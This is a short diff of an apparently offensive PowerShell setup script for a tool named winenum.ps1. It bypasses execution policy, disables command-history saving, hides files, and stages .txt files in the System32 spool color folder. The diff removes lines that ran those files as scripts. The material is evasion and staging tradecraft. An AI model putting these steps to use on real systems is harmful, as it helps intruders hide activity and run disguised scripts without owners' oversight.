@@ -7,13 +7,10 @@ Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 attrib +h winenum.ps1
 Unblock-File -Path .\winenum.ps1
-powershell -ExecutionPolicy Bypass -noninteractive -nologo -File .\winenum.ps1
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\1.txt"
-powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\1.txt"
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\2.txt"
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\2.txt"
-powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\2.txt"
 attrib +h 1.txt
 attrib +h 2.txt
 ################################## Finshed Setup ##################################
